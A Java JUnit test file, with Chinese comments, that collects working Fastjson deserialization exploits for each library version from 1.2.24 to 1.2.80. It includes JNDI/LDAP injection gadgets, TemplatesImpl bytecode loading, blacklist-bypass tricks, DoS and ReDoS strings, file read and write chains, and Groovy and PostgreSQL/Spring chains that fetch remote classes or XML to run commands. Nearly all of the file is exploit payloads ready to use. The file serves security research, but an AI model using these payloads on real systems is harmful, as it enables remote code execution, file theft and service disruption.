import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.Feature;
import com.alibaba.fastjson.parser.ParserConfig;
import com.fasterxml.jackson.core.JsonProcessingException;
import com.fasterxml.jackson.databind.ObjectMapper;
import com.github.enokiy.User;
import org.junit.Test;

public class FastjsonDeserializeVulTest {

    @Test
    public void inputCoerCionExceptionGadget() {

    }

    /**
     * 1. JavaBeanInfo#build(Class<?> clazz, Type type, PropertyNamingStrategy propertyNamingStrategy)：
     * 当实体类的某个属性的getter方法满足一下条件时反序列化对象过程中会自动调用其get方法：
     * 1)只有get方法，没有set方法
     * 2）方法名长度大于4
     * 3）非static方法
     * 4）方法名以get开头，并且第四个字母时大写
     * 5）方法的返回值继承自：Collection、Map或是AtomicBoolean、AtomicInteger、AtomicLong
     */
    @Test
    public void testFastjson() {
        //fastjson的特性：允许有多个逗号;
        String serializedStr = "{\"type\":\"com.github.enokiy.User\",,,,\"name\":\"enokiy\",\"age\":11, \"flag\": true,\"sex\":\"boy\",\"address\":\"china\"}";//
        Object obj = JSON.parseObject(serializedStr, User.class);
        System.out.println(obj);

        try {
            //jackson会抛异常: JsonParseException: Unexpected character (',' (code 44)): was expecting double-quote to start field name
            // at [Source: (String)"{"name":"enokiy",,,,,"age":11, "flag": true,"sex":"boy","address":"china"}"; line: 1, column: 19]
            String serializedStr1 = "{\"name\":\"enokiy\",,,,,\"age\":11, \"flag\": true,\"sex\":\"boy\",\"address\":\"china\"}";//
            new ObjectMapper().readValue(serializedStr1, User.class);
        } catch (JsonProcessingException e) {
            e.printStackTrace();
        }
    }

    /**
     * autotype默认开启,可以通过@type指定任意要实例化的目标类，并可以调用set/get方法来访问属性
     * JdbcRowSetImpl:
     * {
     * "rand1": {
     * "@type": "com.sun.rowset.JdbcRowSetImpl",
     * "dataSourceName": "ldap://localhost:1389/Exploit",
     * "autoCommit": true
     * }
     * }
     * <p>
     * rmi和ldap涉及到jdk版本，需要低版本的jdk
     * <p>
     * TemplatesImpl 的gadget需要fastjson开启SupportNonPublicField，因为TemplatesImpl类中_bytecodes、_tfactory、_name、_outputProperties、_class并没有对应的setter，
     * 所以要为这些private属性赋值，就需要开启SupportNonPublicField特性：
     * String NASTY_CLASS = "com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl";
     * String payload = "{'rand1':{" +
     * "\"@type\":\"" + NASTY_CLASS + "\"," +
     * "\"_bytecodes\":[\"" + evilCode_base64 + "\"]," +
     * "'_name':'aaa'," +
     * "'_tfactory':{}," +
     * "'_outputProperties':{}" +
     * "}}\n";
     */

    @Test
    public void testFastjson1_2_24() {
        String jdbcRowsetImplPayload = "{\n" +
                "  \"jdbcRowsetImpl\": {\n" +
                "    \"@type\": \"com.sun.rowset.JdbcRowSetImpl\",\n" +
                "    \"dataSourceName\": \"ldap://localhost:1389/Object\",\n" +
                "    \"autoCommit\": true\n" +
                "  }\n" +
                "}";
//        JSON.parse(jdbcRowsetImplPayload); //成功
//        JSON.parseObject(jdbcRowsetImplPayload); //成功
//        JSON.parseObject(jdbcRowsetImplPayload,Object.class); //成功
//        JSON.parseObject(jdbcRowsetImplPayload, User.class); //成功，没有直接在外层用@type，加了一层rand:{}这样的格式，还没到类型匹配就能成功触发，这是在xray的一篇文中看到的https://zhuanlan.zhihu.com/p/99075925，所以后面的payload都使用这种模式

        String evilCode = Utils.readClass("target\\classes\\EvilCode.class");
        String NASTY_CLASS = "com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl";
        String templatesImplPayload = "{'rand1':{" +
                "\"@type\":\"" + NASTY_CLASS + "\"," +
                "\"_bytecodes\":[\"" + evilCode + "\"]," +
                "'_name':'aaa'," +
                "'_tfactory':{}," +
                "'_outputProperties':{}" +
                "}}\n";
        ;

        System.out.println(templatesImplPayload);
        JSON.parse(templatesImplPayload, Feature.SupportNonPublicField); //成功
        //JSON.parseObject(payload, Feature.SupportNonPublicField); //成功
        //JSON.parseObject(payload, Object.class, Feature.SupportNonPublicField); //成功
        //JSON.parseObject(payload, User.class, Feature.SupportNonPublicField); //成功
    }

    /**
     * 从1.2.25开始默认关闭了autotype支持，并且加入了checkAutotype，加入了黑名单+白名单来防御autotype开启的情况。在1.2.25到1.2.41之间，发生了一次checkAutotype的绕过。
     * <p>
     * 黑白名单校验方式出错，通过给原来的poc的@type指定的类前后加上L和;可以绕过黑名单检测。
     * 前提：设置autoType为true
     */
    @Test
    public void testFastjson1_2_25To1_2_41() {
        ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
        String jdbcRowsetImplPayload = "{\n" +
                "  \"rand1\": {\n" +
                "    \"@type\": \"Lcom.sun.rowset.JdbcRowSetImpl;\",\n" +
                "    \"dataSourceName\": \"ldap://localhost:1389/Object\",\n" +
                "    \"autoCommit\": true\n" +
                "  }\n" +
                "}";
//        System.out.println(jdbcRowsetImplPayload);
//        JSON.parse(jdbcRowsetImplPayload);

        String evilCode = Utils.readClass("target\\classes\\EvilCode.class");
        String NASTY_CLASS = "com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl";
        String templatesImplPayload = "{'rand1':{" +
                "\"@type\":\"L" + NASTY_CLASS + ";\"," +
                "\"_bytecodes\":[\"" + evilCode + "\"]," +
                "'_name':'aaa'," +
                "'_tfactory':{}," +
                "'_outputProperties':{}" +
                "}}\n";
        ;

        System.out.println(templatesImplPayload);
        JSON.parse(templatesImplPayload, Feature.SupportNonPublicField); //成功
    }

    /**
     * 依然是AutoTypeSupport(true)时的黑名单绕过，将原来POC里面的@type指定的类前后加上LL和;;可以绕过黑名单检测
     */
    @Test
    public void testFastjson1_2_42() {
        ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
        String jdbcRowsetImplPayload = "{\n" +
                "  \"rand1\": {\n" +
                "    \"@type\": \"LLcom.sun.rowset.JdbcRowSetImpl;;\",\n" +
                "    \"dataSourceName\": \"ldap://localhost:1389/Object\",\n" +
                "    \"autoCommit\": true\n" +
                "  }\n" +
                "}";
//        System.out.println(jdbcRowsetImplPayload);
        JSON.parse(jdbcRowsetImplPayload);
    }

    /**
     * 依然是AutoTypeSupport(true)时的黑名单绕过
     * 注意POC里json的语法有点奇怪 :@type的值
     * {"rand1": {"@type": "[com.sun.rowset.JdbcRowSetImpl"[{,"dataSourceName": "ldap://localhost:1389/Object", "autoCommit": true]}}
     * {"rand1": {"@type": "[com.sun.rowset.JdbcRowSetImpl"[{"dataSourceName": "ldap://localhost:1389/Object", "autoCommit": true}}
     * {"rand1": {"@type": "[com.sun.rowset.JdbcRowSetImpl"[{,"dataSourceName": "ldap://localhost:1389/Object", "autoCommit": true}}
     * 都可以，JdbcRowSetImpl"后面只能跟[{
     */

    @Test
    public void testFastjson1_2_43() {
        ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
//        String jdbcRowsetImplPayload = "{\"rand1\":{\"@type\":\"[com.sun.rowset.JdbcRowSetImpl\"[{\"dataSourceName\":\"ldap://127.0.0.1:1389/Exploit\",\"autoCommit\":true]}}";
//        System.out.println(jdbcRowsetImplPayload);
//        JSON.parse(jdbcRowsetImplPayload);
        String jdbcRowsetImplPayload = "{\"rand1\": {\"@type\": \"[com.sun.rowset.JdbcRowSetImpl\"[{,\"dataSourceName\": \"ldap://localhost:1389/Exploit\", \"autoCommit\": true}}";
        System.out.println(jdbcRowsetImplPayload);
        JSON.parseObject(jdbcRowsetImplPayload, User.class);
    }

    /**
     * 1.2.44 版本修复： 删除了之前的L开头、;结尾、LL开头的判断，改成了[开头就抛异常，;结尾也抛异常，所以这样写之前的几次绕过都修复了
     * ver>=1.2.45&ver<1.2.46：
     * 这两个版本期间就是增加黑名单，没有发生checkAutotype绕过。找到黑名单之外的类即可进行利用:ibatis,
     */
    @Test
    public void testFastjson1_2_45() {
        ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
        String ibatisPayload = "{\"@type\":\"org.apache.ibatis.datasource.jndi.JndiDataSourceFactory\",\"properties\":{\"data_source\":\"ldap://localhost:1389/Exploit\"}}";
        JSON.parseObject(ibatisPayload, User.class);
    }

    /**
     * 上面从1.2.25到1.2.46的利用条件都是需要ParserConfig.getGlobalInstance().setAutoTypeSupport(true);才能进行利用
     * 1.2.47在不开启autotype情况下成功利用的poc
     * 1. 利用到了java.lang.class，这个类不在黑名单，所以checkAutotype可以过
     * 2. 这个java.lang.class类对应的deserializer为MiscCodec，deserialize时会取json串中的val值并load这个val对应的class，如果fastjson cache为true，就会缓存这个val对应的class到全局map中（cache默认为true）
     * 3. 如果再次加载val名称的class，并且autotype没开启（因为开启了会先检测黑白名单，所以这个漏洞开启了反而不成功），下一步就是会尝试从全局map中获取这个class，如果获取到了，直接返回
     * <p>
     * 这里有两个版本段：
     * <p>
     * 1.2.25-1.2.32版本：未开启AutoTypeSupport时能成功利用，开启AutoTypeSupport不能利用
     * 1.2.33-1.2.47版本：无论是否开启AutoTypeSupport，都能成功利用
     * poc:
     * <p>
     * {
     * "a":{
     * "@type":"java.lang.Class",
     * "val":"com.sun.rowset.JdbcRowSetImpl"
     * },
     * "b":{
     * "@type":"com.sun.rowset.JdbcRowSetImpl",
     * "dataSourceName":"ldap://localhost:1389/badNameClass",
     * "autoCommit":true
     * }
     * }
     */
    @Test
    public void testFastjson1_2_47() {
        String payload = "{\n" +
                "    \"rand1\": {\n" +
                "        \"@type\": \"java.lang.Class\", \n" +
                "        \"val\": \"com.sun.rowset.JdbcRowSetImpl\"\n" +
                "    }, \n" +
                "    \"rand2\": {\n" +
                "        \"@type\": \"com.sun.rowset.JdbcRowSetImpl\", \n" +
                "        \"dataSourceName\": \"ldap://localhost:1389/Object\", \n" +
                "        \"autoCommit\": true\n" +
                "    }\n" +
                "}";
        JSON.parseObject(payload, User.class);
    }

    /**
     * ver>=1.2.48&ver<=1.2.68
     * 在1.2.48修复了1.2.47的绕过，在MiscCodec，处理Class类的地方，设置了cache为false;
     * 在1.2.48到最新版本1.2.68之间，都是增加黑名单类。
     * <p>
     * <=1.2.59版本中，由于对\x转义字符处理不当,通过构造特定的json字符串可使服务器内存和cpu资源耗尽,实现dos
     */
    @Test
    public void testFastjson1_2_59() {
        String poc = "{\"x\":\"\\x";
        JSON.parseObject(poc, User.class);
    }

    /**
     * 1.2.60修复了检查\x后字符串是否符合十六进制,同时修复了检查isEOF判断条件.
     * 1.2.36 - 1.2.62的redos漏洞:
     * {
     * "regex":{
     * "$ref":"$[blue rlike '^[a-zA-Z]+(([a-zA-Z ])?[a-zA-Z]*)*$']"
     * },
     * "blue":"aaaaaaaaaaaa!"
     * }
     * 注意:生产环境中不要直接打,可能会影响业务
     */
    @Test
    public void testFastjson1_2_62_redos() {
        String poc = "{\n" +
                "    \"regex\":{\n" +
                "        \"$ref\":\"$[poc rlike '^[a-zA-Z]+(([a-zA-Z ])?[a-zA-Z]*)*$']\"\n" +
                "    },\n" +
                "    \"poc\":\"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa!\"\n" +
                "}";
        System.out.println(poc);
//        JSON.parseObject(poc); //成功
//        JSON.parse(poc); //成功
//        JSON.parseObject(poc,Object.class);//成功
//        JSON.parseObject(poc,User.class); //似乎不受影响???
    }

    @Test
    public void testFastjson1_2_62_rce() {
        /**
         * 新Gadget绕过黑名单限制。
         * org.apache.xbean.propertyeditor.JndiConverter类的toObjectImpl()函数存在JNDI注入漏洞，可由其构造函数处触发利用
         *
         * 需要开启AutoType；
         * Fastjson <= 1.2.62；
         * JNDI注入利用所受的JDK版本限制；
         * 目标服务端需要存在xbean-reflect包；
         *
         */
        ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
        String poc1 = "{\"@type\":\"org.apache.xbean.propertyeditor.JndiConverter\",\"AsText\":\"ldap://localhost:1389/Exploit\"}";
        JSON.parseObject(poc1, Object.class); //
    }

    @Test
    public void testFastjson1_2_66_rce() {
        /**
         * 新Gadget绕过黑名单限制。
         * 1.2.66涉及多条Gadget链，原理都是存在JDNI注入漏洞。
         *
         * org.apache.shiro.realm.jndi.JndiRealmFactory类PoC：
         *
         * {"@type":"org.apache.shiro.realm.jndi.JndiRealmFactory", "jndiNames":["ldap://localhost:1389/Exploit"], "Realms":[""]}
         * br.com.anteros.dbcp.AnterosDBCPConfig类PoC：
         *
         * {"@type":"br.com.anteros.dbcp.AnterosDBCPConfig","metricRegistry":"ldap://localhost:1389/Exploit"}
         * 或
         * {"@type":"br.com.anteros.dbcp.AnterosDBCPConfig","healthCheckRegistry":"ldap://localhost:1389/Exploit"}
         * com.ibatis.sqlmap.engine.transaction.jta.JtaTransactionConfig类PoC：
         *
         * {"@type":"com.ibatis.sqlmap.engine.transaction.jta.JtaTransactionConfig","properties": {"@type":"java.util.Properties","UserTransaction":"ldap://localhost:1389/Exploit"}}
         *
         * 前提条件
         * 开启AutoType；
         * Fastjson <= 1.2.66；
         * JNDI注入利用所受的JDK版本限制；
         * org.apache.shiro.jndi.JndiObjectFactory类需要shiro-core包；
         * br.com.anteros.dbcp.AnterosDBCPConfig类需要Anteros-Core和Anteros-DBCP包；
         * com.ibatis.sqlmap.engine.transaction.jta.JtaTransactionConfig类需要ibatis-sqlmap和jta包；
         *
         */
        ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
        String poc = "{\"@type\":\"org.apache.shiro.realm.jndi.JndiRealmFactory\", \"jndiNames\":[\"ldap://localhost:1389/Exploit\"], \"Realms\":[\"\"]}";
//        String poc = "{\"@type\":\"br.com.anteros.dbcp.AnterosDBCPConfig\",\"metricRegistry\":\"ldap://localhost:1389/Exploit\"}";
//        String poc = "{\"@type\":\"br.com.anteros.dbcp.AnterosDBCPConfig\",\"healthCheckRegistry\":\"ldap://localhost:1389/Exploit\"}";
//        String poc = "{\"@type\":\"com.ibatis.sqlmap.engine.transaction.jta.JtaTransactionConfig\"," +
//                "\"properties\": {\"@type\":\"java.util.Properties\",\"UserTransaction\":\"ldap://localhost:1389/Exploit\"}}";
        JSON.parseObject(poc, Object.class);
    }

    @Test
    public void testFastjson1_2_67() {
        /**
         * 新Gadget绕过黑名单限制。
         *
         * org.apache.ignite.cache.jta.jndi.CacheJndiTmLookup类PoC：
         *
         * {"@type":"org.apache.ignite.cache.jta.jndi.CacheJndiTmLookup", "jndiNames":["ldap://localhost:1389/Exploit"], "tm": {"$ref":"$.tm"}}
         * org.apache.shiro.jndi.JndiObjectFactory类PoC：
         *
         * {"@type":"org.apache.shiro.jndi.JndiObjectFactory","resourceName":"ldap://localhost:1389/Exploit","instance":{"$ref":"$.instance"}}
         *
         * 前提条件
         * 开启AutoType；
         * Fastjson <= 1.2.67；
         * JNDI注入利用所受的JDK版本限制；
         * org.apache.ignite.cache.jta.jndi.CacheJndiTmLookup类需要ignite-core、ignite-jta和jta依赖；
         * org.apache.shiro.jndi.JndiObjectFactory类需要shiro-core和slf4j-api依赖；
         */
        ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
//        String poc = "{\"@type\":\"org.apache.ignite.cache.jta.jndi.CacheJndiTmLookup\", \"jndiNames\":[\"ldap://localhost:1389/Exploit\"], \"tm\": {\"$ref\":\"$.tm\"}}";
        String poc = "{\"@type\":\"org.apache.shiro.jndi.JndiObjectFactory\",\"resourceName\":\"ldap://localhost:1389/Exploit\",\"instance\":{\"$ref\":\"$.instance\"}}";
        JSON.parse(poc);
    }

    @Test
    public void testFastjson1_2_68() {
        /**
         * 当传入checkAutoType()函数的expectClass参数不为null，并且需要加载的目标类是expectClass类的子类或者实现类时（不在黑名单中），就将需要加载的目标类当做是正常的类然后通过调用TypeUtils.loadClass()函数进行加载
         * expectClass类包括:Serializable、Cloneable、Closeable、EventListener、Iterable、Collection
         * 寻找实现了AutoCloseable类的输入输出流相关的类作为gadget
         * 利用类：org.eclipse.core.internal.localstore.SafeFileOutputStream -->aspectjtools 包 进行文件复制
         * POC:
         {"@type":"java.lang.AutoCloseable", "@type":"org.eclipse.core.internal.localstore.SafeFileOutputStream", "tempPath":"C:/Windows/win.ini", "targetPath":"D:/wamp64/www/win.txt"}
         *
         *gadget查找方法:
         * 需要一个通过 set 方法或构造方法指定文件路径的 OutputStream；
         * 需要一个通过 set 方法或构造方法传入字节数据的 OutputStream，并且可以通过 set 方法或构造方法传入一个OutputStream，最后可以通过 write 方法将传入的字节码 write 到传入的 OutputStream；
         * 需要一个通过 set 方法或构造方法传入一个 OutputStream，并且可以通过调用 toString、hashCode、get、set、构造方法 调用传入的 OutputStream 的 flush 方法；
         * 以上三个组合在一起就能构造成一个写文件的利用链。
         *
         */
        String fileCopyPayload = "{\"@type\":\"java.lang.AutoCloseable\", \"@type\":\"org.eclipse.core.internal.localstore.SafeFileOutputStream\", \"tempPath\":\"C:/Windows/win.ini\", \"targetPath\":\"./win.txt\"}";
//        JSON.parse(fileCopyPayload);


        /**
         * commons-io写文件
         *
         */
        String commonsIOPayload = "{\n" +
                "  \"x\":{\n" +
                "  \"@type\":\"com.alibaba.fastjson.JSONObject\",\n" +
                "  \"input\":{\n" +
                "  \"@type\":\"java.lang.AutoCloseable\",\n" +
                "  \"@type\":\"org.apache.commons.io.input.ReaderInputStream\",\n" +
                "  \"reader\":{\n" +
                "  \"@type\":\"org.apache.commons.io.input.CharSequenceReader\",\n" +
                "  \"charSequence\":{\"@type\":\"java.lang.String\"\"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa(长度要大于8192，实际写入前8192个字符)\"\n" +
                "  },\n" +
                "  \"charsetName\":\"UTF-8\",\n" +
                "  \"bufferSize\":1024\n" +
                "  },\n" +
                "  \"branch\":{\n" +
                "  \"@type\":\"java.lang.AutoCloseable\",\n" +
                "  \"@type\":\"org.apache.commons.io.output.WriterOutputStream\",\n" +
                "  \"writer\":{\n" +
                "  \"@type\":\"org.apache.commons.io.output.FileWriterWithEncoding\",\n" +
                "  \"file\":\"./pwned\",\n" +
                "  \"encoding\":\"UTF-8\",\n" +
                "  \"append\": false\n" +
                "  },\n" +
                "  \"charsetName\":\"UTF-8\",\n" +
                "  \"bufferSize\": 1024,\n" +
                "  \"writeImmediately\": true\n" +
                "  },\n" +
                "  \"trigger\":{\n" +
                "  \"@type\":\"java.lang.AutoCloseable\",\n" +
                "  \"@type\":\"org.apache.commons.io.input.XmlStreamReader\",\n" +
                "  \"is\":{\n" +
                "  \"@type\":\"org.apache.commons.io.input.TeeInputStream\",\n" +
                "  \"input\":{\n" +
                "  \"$ref\":\"$.input\"\n" +
                "  },\n" +
                "  \"branch\":{\n" +
                "  \"$ref\":\"$.branch\"\n" +
                "  },\n" +
                "  \"closeBranch\": true\n" +
                "  },\n" +
                "  \"httpContentType\":\"text/xml\",\n" +
                "  \"lenient\":false,\n" +
                "  \"defaultEncoding\":\"UTF-8\"\n" +
                "  },\n" +
                "  \"trigger2\":{\n" +
                "  \"@type\":\"java.lang.AutoCloseable\",\n" +
                "  \"@type\":\"org.apache.commons.io.input.XmlStreamReader\",\n" +
                "  \"is\":{\n" +
                "  \"@type\":\"org.apache.commons.io.input.TeeInputStream\",\n" +
                "  \"input\":{\n" +
                "  \"$ref\":\"$.input\"\n" +
                "  },\n" +
                "  \"branch\":{\n" +
                "  \"$ref\":\"$.branch\"\n" +
                "  },\n" +
                "  \"closeBranch\": true\n" +
                "  },\n" +
                "  \"httpContentType\":\"text/xml\",\n" +
                "  \"lenient\":false,\n" +
                "  \"defaultEncoding\":\"UTF-8\"\n" +
                "  },\n" +
                "  \"trigger3\":{\n" +
                "  \"@type\":\"java.lang.AutoCloseable\",\n" +
                "  \"@type\":\"org.apache.commons.io.input.XmlStreamReader\",\n" +
                "  \"is\":{\n" +
                "  \"@type\":\"org.apache.commons.io.input.TeeInputStream\",\n" +
                "  \"input\":{\n" +
                "  \"$ref\":\"$.input\"\n" +
                "  },\n" +
                "  \"branch\":{\n" +
                "  \"$ref\":\"$.branch\"\n" +
                "  },\n" +
                "  \"closeBranch\": true\n" +
                "  },\n" +
                "  \"httpContentType\":\"text/xml\",\n" +
                "  \"lenient\":false,\n" +
                "  \"defaultEncoding\":\"UTF-8\"\n" +
                "  }\n" +
                "  }\n" +
                "}";
        JSON.parseObject(commonsIOPayload);
    }

    @Test
    public void testFastjson1_2_80() {
        /**
         *
         */
        String poc1 = "{\n" +
                "    \"@type\":\"java.lang.Exception\",\n" +
                "    \"@type\":\"org.aspectj.org.eclipse.jdt.internal.compiler.lookup.SourceTypeCollisionException\"\n" +
                "}";
//        System.out.println(poc1);

        String poc2 = "{\n" +
                "    \"x\":{\n" +
                "        \"@type\":\"java.util.Locale\",\n" +
                "        \"val\":{\n" +
                "            \"@type\":\"com.alibaba.fastjson.JSONObject\",\n" +
                "\t\t\t{\n" +
                "                \"@type\":\"java.lang.String\"\n" +
                "                \"@type\":\"org.aspectj.org.eclipse.jdt.internal.compiler.lookup.SourceTypeCollisionException\",\n" +
                "                \"newAnnotationProcessorUnits\":[{}]\n" +
                "            }\n" +
                "        }\n" +
                "    }";
//        System.out.println(poc2);

        String poc3 = "{\n" +
                "    \"x\":{\n" +
                "        \"@type\":\"org.aspectj.org.eclipse.jdt.internal.compiler.env.ICompilationUnit\",\n" +
                "        \"@type\":\"org.aspectj.org.eclipse.jdt.internal.core.BasicCompilationUnit\",\n" +
                "        \"fileName\":\"C:/Windows/System32/drivers/etc/hosts\"\n" +
                "    }\n" +
                "}";
//        System.out.println(poc3);
//        JSON.parseObject(poc1);
//        try {
//            JSON.parseObject(poc2);
//        } catch (Exception e){}
//        System.out.println(JSON.parseObject(poc3));


    }

    /**
     * 1.2.80依赖groovy，poc需要分两块；
     * 两者无法合并成一个poc，原因是在创建CompilationFailedException的实例之后为unit属性赋值时没有setUnit方法，直接抛出异常，json解析终止，后半部分的json不会被解析；
     * 发送两次payload不会影响deserializer中的缓存信息，因为ParserConfig对象时static的，第一次解析抛异常之后CompilationFailedException的deserialzer依然会被放入deserializers中，第二次可以正常获取；
     * {
     * "@type":"java.lang.Exception",
     * "@type":"org.codehaus.groovy.control.CompilationFailedException",
     * "unit":{}
     * }
     * <p>
     * {
     * "@type":"org.codehaus.groovy.control.ProcessingUnit",
     * "@type":"org.codehaus.groovy.tools.javac.JavaStubCompilationUnit",
     * "config":{
     * "@type":"org.codehaus.groovy.control.CompilerConfiguration",
     * "classpathList":"http://127.0.0.1:8090/"
     * }
     * }
     * <p>
     * 在webserver下创建META-INF/services/org.codehaus.groovy.transform.ASTTransformation文件和Evil.class,META-INF/services/org.codehaus.groovy.transform.ASTTransformation的内容为Evil.
     * Evil.class的内容参考groovyEvilPoc,注意Evil.class中的@GroovyASTTransformation注解
     */
    @Test
    public void test1280_groovy() {
        String payload_1 = "{\n" +
                "    \"@type\":\"java.lang.Exception\",\n" +
                "    \"@type\":\"org.codehaus.groovy.control.CompilationFailedException\",\n" +
                "    \"unit\":{}\n" +
                "}";
        String payload_2 = "{\n" +
                "    \"@type\":\"org.codehaus.groovy.control.ProcessingUnit\",\n" +
                "    \"@type\":\"org.codehaus.groovy.tools.javac.JavaStubCompilationUnit\",\n" +
                "    \"config\":{\n" +
                "        \"@type\":\"org.codehaus.groovy.control.CompilerConfiguration\",\n" +
                "        \"classpathList\":\"http://127.0.0.1:8090/\"\n" +
                "    }\n" +
                "}";
        try {
            JSON.parseObject(payload_1);
        } catch (Exception e) {
        }
        JSON.parseObject(payload_2);
    }

    @Test
    public void test1280_groovy_1(){
        String payload="";

        String payload_2 = "{\n" +
                "    \"a\": \"{\\\"@type\\\": \\\"java.lang.Exception\\\",\\\"@type\\\": \\\"org.codehaus.groovy.control.CompilationFailedException\\\",\\\"unit\\\": {}}\",\n" +
                "    \"b\": {\n" +
                "        \"$ref\": \"$.a.a\"\n" +
                "    },\n" +
                "    \"c\": \"{\\\"@type\\\": \\\"org.codehaus.groovy.control.ProcessingUnit\\\",\\\"@type\\\": \\\"org.codehaus.groovy.tools.javac.JavaStubCompilationUnit\\\",\\\"config\\\": {\\\"@type\\\": \\\"org.codehaus.groovy.control.CompilerConfiguration\\\",\\\"classpathList\\\": \\\"http://127.0.0.1:8090/\\\"}}\",\n" +
                "    \"d\": {\n" +
                "        \"$ref\": \"$.c.d\"\n" +
                "    }\n" +
                "}";

        System.out.println(payload_2);
        JSON.parseObject(payload_2);
    }

    /**依赖jython+postgresql+spring-context
     * poc:
      {
          "a":{
          "@type":"java.lang.Exception",
          "@type":"org.python.antlr.ParseException",
          "type":{}
          },
          "b":{
              "@type":"org.python.core.PyObject",
              "@type":"com.ziclix.python.sql.PyConnection",
              "connection":{
                  "@type":"org.postgresql.jdbc.PgConnection",
                  "hostSpecs":[
                      {
                          "host":"127.0.0.1",
                          "port":2333
                      }
                  ],
                  "user":"user",
                  "database":"test",
                  "info":{
                      "socketFactory":"org.springframework.context.support.ClassPathXmlApplicationContext",
                      "socketFactoryArg":"http://127.0.0.1:8090/exp.xml"
                  },
                  "url":""
              }
          }
      }

     exp.xml的内容:
     <beans xmlns="http://www.springframework.org/schema/beans"
     xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
     xsi:schemaLocation="http://www.springframework.org/schema/beans
     http://www.springframework.org/schema/beans/spring-beans.xsd">
     <bean id="pb" class="java.lang.ProcessBuilder">
     <constructor-arg>
     <list value-type="java.lang.String" >
     <value>cmd</value>
     <value>/c</value>
     <value>calc</value>
     </list>
     </constructor-arg>
     <property name="whatever" value="#{pb.start()}"/>
     </bean>
     </beans>

     不需要要开启2333端口的数据库端口即可触发
     */
    @Test
    public void test1280JDBC() {
        String payload = "{\n" +
                "    \"a\":{\n" +
                "    \"@type\":\"java.lang.Exception\",\n" +
                "    \"@type\":\"org.python.antlr.ParseException\",\n" +
                "    \"type\":{}\n" +
                "    },\n" +
                "    \"b\":{\n" +
                "        \"@type\":\"org.python.core.PyObject\",\n" +
                "        \"@type\":\"com.ziclix.python.sql.PyConnection\",\n" +
                "        \"connection\":{\n" +
                "            \"@type\":\"org.postgresql.jdbc.PgConnection\",\n" +
                "            \"hostSpecs\":[\n" +
                "                {\n" +
                "                    \"host\":\"127.0.0.1\",\n" +
                "                    \"port\":2333\n" +
                "                }\n" +
                "            ],\n" +
                "            \"user\":\"user\",\n" +
                "            \"database\":\"test\",\n" +
                "            \"info\":{\n" +
                "                \"socketFactory\":\"org.springframework.context.support.ClassPathXmlApplicationContext\",\n" +
                "                \"socketFactoryArg\":\"http://127.0.0.1:8090/exp.xml\"\n" +
                "            },\n" +
                "            \"url\":\"\"\n" +
                "        }\n" +
                "    }\n" +
                "}";
        JSON.parseObject(payload);
    }
}
